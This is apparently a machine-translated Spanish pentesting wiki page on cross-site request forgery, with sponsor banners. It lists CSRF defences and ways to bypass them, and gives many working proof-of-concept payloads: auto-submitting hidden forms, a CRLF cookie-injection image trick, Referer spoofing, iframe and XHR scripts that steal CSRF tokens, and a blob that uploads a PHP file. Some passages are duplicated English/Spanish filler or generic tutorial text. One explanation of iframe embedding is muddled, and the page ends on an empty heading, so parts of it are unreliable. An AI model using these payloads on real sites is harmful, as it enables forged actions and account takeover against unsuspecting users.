# CSRF (Cross Site Request Forgery)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender m√°s sobre errores web3**

üêû Lee tutoriales de errores web3

üîî Recibe notificaciones sobre nuevas recompensas por errores

üí¨ Participa en discusiones comunitarias

## ¬øQu√© es CSRF?

**Cross-site request forgery** (tambi√©n conocido como CSRF) es una vulnerabilidad de seguridad web que permite a un atacante **inducir a los usuarios a realizar acciones que no desean realizar**.\
Esto se logra **haciendo que un usuario con sesi√≥n iniciada** en la plataforma v√≠ctima acceda a un sitio web controlado por el atacante y desde all√≠ **ejecute** c√≥digo JS malicioso, env√≠e formularios o recupere "im√°genes" en la **cuenta de la v√≠ctima**.

### Requisitos

Para poder aprovechar una vulnerabilidad de CSRF, primero debes **encontrar una acci√≥n relevante para abusar** (cambiar la contrase√±a o el correo electr√≥nico, hacer que la v√≠ctima te siga en una red social, darte m√°s privilegios...). La **sesi√≥n debe depender solo de cookies o del encabezado de autenticaci√≥n b√°sica HTTP**, no se puede usar ning√∫n otro encabezado para manejar la sesi√≥n. Y por √∫ltimo, no debe haber **par√°metros impredecibles** en la solicitud.

Se pueden implementar varias **contramedidas** para evitar esta vulnerabilidad.

### **Defensas comunes**

* [**Cookies SameSite**](hacking-with-cookies/#samesite): Si la cookie de sesi√≥n utiliza esta bandera, es posible que no puedas enviar la cookie desde sitios web arbitrarios.
* [**Compartici√≥n de recursos entre or√≠genes**](cors-bypass.md): Dependiendo del tipo de solicitud HTTP que necesites realizar para abusar de la acci√≥n relevante, debes tener en cuenta la **pol√≠tica CORS del sitio v√≠ctima**. _Ten en cuenta que la pol√≠tica CORS no afectar√° si solo quieres enviar una solicitud GET o una solicitud POST desde un formulario y no necesitas leer la respuesta._
* Solicitar la **contrase√±a** del usuario para autorizar la acci√≥n.
* Resolver un **captcha**
* Leer los encabezados **Referrer** u **Origin**. Si se utiliza una expresi√≥n regular, se puede eludir, por ejemplo, con:
* http://mal.net?orig=http://example.com (termina con la URL)
* http://example.com.mal.net (comienza con la URL)
* **Modificar** el **nombre** de los **par√°metros** de la solicitud POST o GET
* Usar un **token CSRF** en cada sesi√≥n. Este token debe enviarse dentro de la solicitud para confirmar la acci√≥n. Este token puede estar protegido con CORS.

### Mapa de CSRF

![](<../.gitbook/assets/image (112).png>)

## Bypass de defensas

### De POST a GET

Tal vez el formulario que deseas aprovechar est√° preparado para enviar una **solicitud POST con un token CSRF**, pero debes **verificar** si tambi√©n es **v√°lido** enviar una solicitud **GET** y si al enviar una solicitud GET el **token CSRF sigue siendo validado**.

### Falta de token

Algunas aplicaciones validan correctamente el token cuando est√° presente, pero **omitir√°n la validaci√≥n si se omite el token**.\
En esta situaci√≥n, el atacante puede **eliminar el par√°metro completo** que contiene el token (no solo su valor) para eludir la validaci√≥n y realizar un ataque CSRF.

### El token CSRF no est√° vinculado a la sesi√≥n del usuario

Algunas aplicaciones **no validan que el token pertenezca a la misma sesi√≥n** que el usuario que realiza la solicitud. En su lugar, la aplicaci√≥n **mantiene un conjunto global de tokens** que ha emitido y acepta cualquier token que aparezca en este conjunto.\
En esta situaci√≥n, el atacante puede iniciar sesi√≥n en la aplicaci√≥n utilizando su propia cuenta, **obtener un token v√°lido** y luego **proporcionar ese token al usuario v√≠ctima** en su ataque CSRF.

### Bypass de m√©todo

Si la solicitud utiliza un **m√©todo "extra√±o"**, verifica si la **funcionalidad de anulaci√≥n de m√©todo** est√° funcionando.\
Por ejemplo, si se est√° utilizando un m√©todo **PUT**, puedes intentar **usar un m√©todo POST** y **enviar**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Esto tambi√©n puede funcionar enviando el **par√°metro \_method dentro de una solicitud POST** o utilizando los **encabezados**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### Bypass personalizado de token de encabezado

Si la solicitud est√° agregando un **encabezado personalizado** con un **token** a la solicitud como m√©todo de protecci√≥n contra CSRF, entonces:

* Prueba la solicitud sin el **Token personalizado y tambi√©n el encabezado**.
* Prueba la solicitud con un **token diferente pero de la misma longitud**.

### El token CSRF se verifica mediante una cookie

En una variaci√≥n adicional de la vulnerabilidad anterior, algunas aplicaciones **duplican cada token dentro de una cookie y un par√°metro de solicitud**. O **configuran una cookie CSRF** y **verifican en el backend si el token CSRF enviado es el relacionado con la cookie**.

Cuando se valida la solicitud posterior, la aplicaci√≥n simplemente verifica que el **token** enviado en el **par√°metro de solicitud coincida** con el valor almacenado por la **cookie**.\
En esta situaci√≥n, el atacante puede nuevamente realizar un ataque CSRF **si el sitio web contiene alguna vulnerabilidad que le permita configurar su cookie CSRF en la v√≠ctima como un CRLF**.

En este caso, puedes configurar la cookie intentando cargar una imagen falsa y luego lanzar el ataque CSRF como en este ejemplo:
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
Ten en cuenta que si el **token csrf est√° relacionado con la cookie de sesi√≥n, este ataque no funcionar√°** porque necesitar√°s establecerle a la v√≠ctima tu sesi√≥n, y por lo tanto estar√°s atac√°ndote a ti mismo.
{% endhint %}

### Cambio de Content-Type

Seg√∫n [**esto**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), para **evitar las solicitudes de preflight** utilizando el m√©todo **POST**, estos son los valores permitidos para Content-Type:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Sin embargo, ten en cuenta que la **l√≥gica del servidor puede variar** dependiendo del **Content-Type** utilizado, por lo que debes probar los valores mencionados y otros como **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Ejemplo (de [aqu√≠](https://brycec.me/posts/corctf\_2021\_challenges)) de env√≠o de datos JSON como text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Bypass de solicitud de preflight de tipo de contenido application/json

Como ya sabes, no puedes enviar una solicitud POST con el tipo de contenido **`application/json`** a trav√©s de un formulario HTML, y si intentas hacerlo a trav√©s de **`XMLHttpRequest`**, primero se env√≠a una solicitud de preflight.\
Sin embargo, podr√≠as intentar enviar los datos JSON utilizando los tipos de contenido **`text/plain`** y **`application/x-www-form-urlencoded`** solo para comprobar si el backend est√° utilizando los datos independientemente del tipo de contenido.\
Puedes enviar un formulario utilizando `Content-Type: text/plain` estableciendo **`enctype="text/plain"`**

Si el servidor solo acepta el tipo de contenido "application/json", puedes **enviar el tipo de contenido "text/plain; application/json"** sin activar una solicitud de preflight.

Tambi√©n podr√≠as intentar **burlar** esta restricci√≥n utilizando un archivo flash **SWF**. Para obtener m√°s informaci√≥n, [**lee este art√≠culo**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypass de verificaci√≥n de Referer / Origin

**Evita el encabezado Referer**

Algunas aplicaciones validan el encabezado Referer cuando est√° presente en las solicitudes, pero **omitir√°n la validaci√≥n si el encabezado se omite**.
```markup
<meta name="referrer" content="never">
```
**Bypasses de Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Para establecer el nombre de dominio del servidor en la URL que el Referrer va a enviar dentro de los par√°metros, puedes hacer lo siguiente:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender m√°s sobre errores web3**

üêû Lee tutoriales sobre errores web3

üîî Recibe notificaciones sobre nuevas recompensas por errores

üí¨ Participa en discusiones comunitarias

## **Ejemplos de explotaci√≥n**

### **Exfiltraci√≥n de token CSRF**

Si se est√° utilizando un **token CSRF** como **defensa**, puedes intentar **exfiltrarlo** aprovechando una vulnerabilidad de [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) o una vulnerabilidad de [**Dangling Markup**](dangling-markup-html-scriptless-injection.md).

### **GET utilizando etiquetas HTML**
```markup
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Otras etiquetas HTML5 que se pueden utilizar para enviar autom√°ticamente una solicitud GET son:

![](<../.gitbook/assets/image (530).png>)

### Solicitud GET de formulario
```markup
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Solicitud de env√≠o de formulario

A common method used to submit data to a web server is through a form POST request. This type of request is typically used when submitting sensitive information, such as login credentials or payment details. 

Un m√©todo com√∫n utilizado para enviar datos a un servidor web es a trav√©s de una solicitud de env√≠o de formulario (form POST request). Este tipo de solicitud se utiliza generalmente al enviar informaci√≥n sensible, como credenciales de inicio de sesi√≥n o detalles de pago.

To make a form POST request, the client sends an HTTP POST request to the server with the form data included in the request body. The server then processes the data and responds accordingly. 

Para realizar una solicitud de env√≠o de formulario, el cliente env√≠a una solicitud HTTP POST al servidor con los datos del formulario incluidos en el cuerpo de la solicitud. Luego, el servidor procesa los datos y responde en consecuencia.

### Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) is an attack that tricks the victim into submitting a malicious request. This attack occurs when a malicious website or email tricks the victim's browser into making a request to a target website on which the victim is authenticated. 

Cross-Site Request Forgery (CSRF) es un ataque que enga√±a a la v√≠ctima para que env√≠e una solicitud maliciosa. Este ataque ocurre cuando un sitio web o correo electr√≥nico malicioso enga√±a al navegador de la v√≠ctima para que realice una solicitud a un sitio web objetivo en el que la v√≠ctima est√° autenticada.

The attack takes advantage of the fact that many websites rely solely on session cookies for authentication, without additional security measures. By tricking the victim's browser into making a request, the attacker can perform actions on behalf of the victim without their knowledge or consent. 

El ataque aprovecha el hecho de que muchos sitios web se basan √∫nicamente en cookies de sesi√≥n para la autenticaci√≥n, sin medidas de seguridad adicionales. Al enga√±ar al navegador de la v√≠ctima para que realice una solicitud, el atacante puede realizar acciones en nombre de la v√≠ctima sin su conocimiento o consentimiento.

To prevent CSRF attacks, web applications can implement measures such as using anti-CSRF tokens, checking the Referer header, or implementing the SameSite attribute for cookies. These measures help ensure that requests are only accepted from legitimate sources and not from malicious websites. 

Para prevenir ataques CSRF, las aplicaciones web pueden implementar medidas como el uso de tokens anti-CSRF, verificar la cabecera Referer o implementar el atributo SameSite para las cookies. Estas medidas ayudan a garantizar que las solicitudes solo sean aceptadas desde fuentes leg√≠timas y no desde sitios web maliciosos.
```markup
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Solicitud de env√≠o de formulario a trav√©s de un iframe

One common technique used in Cross-Site Request Forgery (CSRF) attacks is to submit a form through an iframe. This technique allows an attacker to trick a user into unknowingly submitting a form on a targeted website.

To execute this attack, the attacker creates a malicious webpage that contains an iframe pointing to the target website's form submission URL. The attacker then lures the victim into visiting the malicious webpage.

When the victim visits the malicious webpage, the iframe automatically submits the form on the target website, using the victim's authenticated session. Since the victim is already logged in to the target website, the form submission appears legitimate to the server.

This technique can be particularly effective when combined with social engineering tactics, such as sending the victim a link to the malicious webpage via email or a messaging platform.

To protect against this type of attack, web developers should implement measures such as:

- Implementing anti-CSRF tokens: By including a unique token in each form submission, developers can ensure that the form is only submitted from their own website and not from a malicious source.
- Implementing SameSite cookies: By setting the SameSite attribute to "Strict" or "Lax" for cookies, developers can prevent them from being sent in cross-origin requests, thereby mitigating the risk of CSRF attacks.
- Implementing strong authentication and session management: By enforcing strong authentication mechanisms and properly managing user sessions, developers can reduce the risk of unauthorized form submissions.

By understanding and implementing these security measures, web developers can effectively protect their websites against CSRF attacks executed through iframes.
```markup
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Solicitud POST de Ajax**

An Ajax POST request is a type of HTTP request that is sent asynchronously from a web page to a server using the Ajax technology. This type of request is commonly used to send data to the server without requiring a page refresh.

Una solicitud POST de Ajax es un tipo de solicitud HTTP que se env√≠a de forma as√≠ncrona desde una p√°gina web a un servidor utilizando la tecnolog√≠a Ajax. Este tipo de solicitud se utiliza com√∫nmente para enviar datos al servidor sin requerir una actualizaci√≥n de la p√°gina.

```javascript
$.ajax({
  url: "/endpoint",
  type: "POST",
  data: {
    param1: "value1",
    param2: "value2"
  },
  success: function(response) {
    console.log(response);
  },
  error: function(xhr, status, error) {
    console.log(error);
  }
});
```

The above code snippet demonstrates an example of an Ajax POST request using jQuery. The `url` parameter specifies the endpoint where the request is sent, the `type` parameter specifies the HTTP method (in this case, POST), and the `data` parameter contains the data to be sent to the server.

El fragmento de c√≥digo anterior muestra un ejemplo de una solicitud POST de Ajax utilizando jQuery. El par√°metro `url` especifica el punto final al que se env√≠a la solicitud, el par√°metro `type` especifica el m√©todo HTTP (en este caso, POST), y el par√°metro `data` contiene los datos que se enviar√°n al servidor.

The `success` function is called when the request is successful, and the `response` parameter contains the response from the server. The `error` function is called when an error occurs during the request, and the `xhr`, `status`, and `error` parameters provide information about the error.

La funci√≥n `success` se llama cuando la solicitud es exitosa, y el par√°metro `response` contiene la respuesta del servidor. La funci√≥n `error` se llama cuando ocurre un error durante la solicitud, y los par√°metros `xhr`, `status` y `error` proporcionan informaci√≥n sobre el error.
```markup
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### Solicitud POST multipart/form-data

When submitting a form on a website, the data is typically sent using the `application/x-www-form-urlencoded` content type. However, in some cases, the form may require the use of the `multipart/form-data` content type.

Cuando se env√≠a un formulario en un sitio web, los datos se suelen enviar utilizando el tipo de contenido `application/x-www-form-urlencoded`. Sin embargo, en algunos casos, el formulario puede requerir el uso del tipo de contenido `multipart/form-data`.

This content type is commonly used when uploading files or when the form includes binary data. It allows the data to be divided into multiple parts, each with its own content type and headers.

Este tipo de contenido se utiliza com√∫nmente cuando se cargan archivos o cuando el formulario incluye datos binarios. Permite que los datos se dividan en varias partes, cada una con su propio tipo de contenido y encabezados.

To send a `multipart/form-data` POST request, the request body must be formatted accordingly. Each part of the data should be separated by a boundary, which is a unique string that does not appear in the data itself.

Para enviar una solicitud POST `multipart/form-data`, el cuerpo de la solicitud debe estar formateado correctamente. Cada parte de los datos debe estar separada por un l√≠mite, que es una cadena √∫nica que no aparece en los propios datos.

Each part consists of a set of headers and the actual data. The headers specify the content type, content disposition, and other relevant information.

Cada parte consta de un conjunto de encabezados y los datos reales. Los encabezados especifican el tipo de contenido, la disposici√≥n del contenido y otra informaci√≥n relevante.

Here is an example of a `multipart/form-data` POST request:

Aqu√≠ tienes un ejemplo de una solicitud POST `multipart/form-data`:

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="file"; filename="example.txt"
Content-Type: text/plain

This is the content of the file.

-----------------------------1234567890
Content-Disposition: form-data; name="name"

John Doe
-----------------------------1234567890--
```

In this example, the request is sent to `example.com/upload` with a `multipart/form-data` content type. The request body consists of two parts: one for the file upload and another for the name field.

En este ejemplo, la solicitud se env√≠a a `example.com/upload` con un tipo de contenido `multipart/form-data`. El cuerpo de la solicitud consta de dos partes: una para la carga del archivo y otra para el campo de nombre.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### Solicitud POST multipart/form-data v2

In this technique, we will explore how to perform a Cross-Site Request Forgery (CSRF) attack using a multipart/form-data POST request. This technique is commonly used to exploit web applications that do not implement proper CSRF protection.

En esta t√©cnica, exploraremos c√≥mo realizar un ataque de falsificaci√≥n de solicitud entre sitios (CSRF) utilizando una solicitud POST multipart/form-data. Esta t√©cnica se utiliza com√∫nmente para explotar aplicaciones web que no implementan una protecci√≥n adecuada contra CSRF.

#### Overview

The multipart/form-data content type is commonly used for file uploads and form submissions that contain binary data. It allows the client to send multiple parts of data in a single request.

El tipo de contenido multipart/form-data se utiliza com√∫nmente para cargar archivos y enviar formularios que contienen datos binarios. Permite al cliente enviar varias partes de datos en una sola solicitud.

#### Exploiting CSRF using multipart/form-data

To exploit CSRF using a multipart/form-data POST request, we need to create a form that submits the desired request to the target application. This form should include all the necessary fields and values required by the target application.

Para explotar CSRF utilizando una solicitud POST multipart/form-data, debemos crear un formulario que env√≠e la solicitud deseada a la aplicaci√≥n objetivo. Este formulario debe incluir todos los campos y valores necesarios requeridos por la aplicaci√≥n objetivo.

The key point in this technique is to ensure that the target application accepts requests with the multipart/form-data content type without performing any CSRF validation. This can be achieved by bypassing any CSRF protection mechanisms implemented by the application.

El punto clave en esta t√©cnica es asegurarse de que la aplicaci√≥n objetivo acepte solicitudes con el tipo de contenido multipart/form-data sin realizar ninguna validaci√≥n CSRF. Esto se puede lograr al eludir cualquier mecanismo de protecci√≥n CSRF implementado por la aplicaci√≥n.

#### Conclusion

Performing a CSRF attack using a multipart/form-data POST request can be an effective way to exploit web applications that lack proper CSRF protection. By understanding how this technique works, you can better defend against such attacks and ensure the security of your web applications.

Realizar un ataque CSRF utilizando una solicitud POST multipart/form-data puede ser una forma efectiva de explotar aplicaciones web que carecen de una protecci√≥n CSRF adecuada. Al comprender c√≥mo funciona esta t√©cnica, puede defenderse mejor contra tales ataques y garantizar la seguridad de sus aplicaciones web.
```javascript
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Solicitud POST de formulario desde un iframe

When an HTML form is submitted, the browser sends a POST request to the server with the form data. This can be exploited in a Cross-Site Request Forgery (CSRF) attack by tricking a user into submitting a form without their knowledge or consent.

Cuando se env√≠a un formulario HTML, el navegador env√≠a una solicitud POST al servidor con los datos del formulario. Esto puede ser explotado en un ataque de falsificaci√≥n de solicitud entre sitios (CSRF) al enga√±ar a un usuario para que env√≠e un formulario sin su conocimiento o consentimiento.

One way to execute a CSRF attack is by embedding a malicious website within an iframe on a legitimate website. When the user visits the legitimate website, the malicious website can automatically submit a form on the legitimate website using JavaScript.

Una forma de ejecutar un ataque CSRF es mediante la inserci√≥n de un sitio web malicioso dentro de un iframe en un sitio web leg√≠timo. Cuando el usuario visita el sitio web leg√≠timo, el sitio web malicioso puede enviar autom√°ticamente un formulario en el sitio web leg√≠timo utilizando JavaScript.

To do this, the attacker needs to create a hidden iframe on the malicious website and set its `src` attribute to the URL of the legitimate website's form. The attacker can then use JavaScript to automatically submit the form within the iframe.

Para hacer esto, el atacante necesita crear un iframe oculto en el sitio web malicioso y establecer su atributo `src` en la URL del formulario del sitio web leg√≠timo. Luego, el atacante puede utilizar JavaScript para enviar autom√°ticamente el formulario dentro del iframe.

When the user visits the malicious website, the hidden iframe will load the form from the legitimate website and submit it without the user's knowledge. This allows the attacker to perform actions on behalf of the user, such as changing their password or making unauthorized transactions.

Cuando el usuario visita el sitio web malicioso, el iframe oculto cargar√° el formulario del sitio web leg√≠timo y lo enviar√° sin el conocimiento del usuario. Esto permite al atacante realizar acciones en nombre del usuario, como cambiar su contrase√±a o realizar transacciones no autorizadas.

To protect against CSRF attacks, web developers should implement measures such as using anti-CSRF tokens, checking the `Referer` header, and implementing strict access controls.

Para protegerse contra los ataques CSRF, los desarrolladores web deben implementar medidas como el uso de tokens anti-CSRF, verificar la cabecera `Referer` e implementar controles de acceso estrictos.
```markup
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Robar el token CSRF y enviar una solicitud POST**

En un ataque de falsificaci√≥n de solicitud entre sitios (CSRF), el objetivo es enga√±ar al usuario para que realice una acci√≥n no deseada en un sitio web en el que ya est√° autenticado. Para llevar a cabo este ataque, es necesario robar el token CSRF del usuario y luego enviar una solicitud POST utilizando ese token.

Aqu√≠ hay un ejemplo de c√≥mo se puede realizar este ataque:

1. Obtener el token CSRF: El token CSRF se encuentra generalmente en una cookie o en una etiqueta oculta en el formulario. Utilizando t√©cnicas de ingenier√≠a social o de inyecci√≥n de c√≥digo, se puede obtener este token del usuario.

2. Crear una solicitud POST: Una vez que se ha obtenido el token CSRF, se puede utilizar para crear una solicitud POST falsa. Esta solicitud puede contener cualquier acci√≥n no deseada, como cambiar la contrase√±a del usuario o realizar una compra no autorizada.

3. Enviar la solicitud POST: La solicitud POST falsa se env√≠a al servidor web objetivo. Dado que la solicitud contiene el token CSRF v√°lido, el servidor la considerar√° leg√≠tima y realizar√° la acci√≥n solicitada.

Es importante tener en cuenta que este ataque solo es exitoso si el usuario est√° autenticado en el sitio web objetivo y si el sitio no implementa medidas de protecci√≥n adecuadas, como la verificaci√≥n del origen de las solicitudes.

Para protegerse contra los ataques CSRF, los desarrolladores deben implementar medidas como el uso de tokens CSRF aleatorios y √∫nicos, la verificaci√≥n del origen de las solicitudes y la implementaci√≥n de pol√≠ticas de seguridad adecuadas en el servidor web.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Robar el token CSRF y enviar una solicitud POST utilizando un iframe, un formulario y Ajax**

El robo de tokens CSRF es una t√©cnica com√∫n utilizada en ataques de falsificaci√≥n de solicitudes entre sitios. Esta t√©cnica aprovecha la confianza que un sitio web tiene en las solicitudes enviadas desde su propio dominio.

Para robar el token CSRF, se puede utilizar un iframe oculto que cargue la p√°gina objetivo que contiene el token. Luego, se puede acceder al contenido del iframe y extraer el valor del token.

```html
<iframe id="csrfFrame" src="https://www.sitio-objetivo.com" style="display: none;"></iframe>
<script>
    var csrfFrame = document.getElementById('csrfFrame');
    var csrfToken = csrfFrame.contentDocument.querySelector('input[name="csrf_token"]').value;
    // Aqu√≠ se puede enviar el token a un servidor malicioso o realizar otras acciones
</script>
```

Una vez que se ha robado el token CSRF, se puede utilizar para enviar una solicitud POST falsificada al servidor objetivo. Esto se puede hacer utilizando un formulario oculto que se completa autom√°ticamente con el token robado y se env√≠a mediante JavaScript.

```html
<form id="csrfForm" action="https://www.sitio-objetivo.com" method="POST" style="display: none;">
    <input type="hidden" name="csrf_token" value="">
    <!-- Otros campos del formulario -->
</form>
<script>
    var csrfForm = document.getElementById('csrfForm');
    csrfForm.querySelector('input[name="csrf_token"]').value = csrfToken;
    csrfForm.submit();
</script>
```

Otra forma de enviar la solicitud POST falsificada es utilizando Ajax. Se puede crear una solicitud Ajax y establecer el valor del token CSRF en el encabezado de la solicitud.

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://www.sitio-objetivo.com', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('X-CSRF-Token', csrfToken);
// Aqu√≠ se pueden agregar otros encabezados y datos de la solicitud
xhr.send();
```

Estas t√©cnicas permiten a un atacante robar el token CSRF y enviar solicitudes falsificadas en nombre del usuario leg√≠timo. Es importante que los desarrolladores implementen medidas de protecci√≥n adecuadas, como el uso de tokens CSRF con duraci√≥n limitada y la validaci√≥n estricta de las solicitudes recibidas.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Robar el token CSRF y enviar una solicitud POST utilizando un iframe y un formulario**

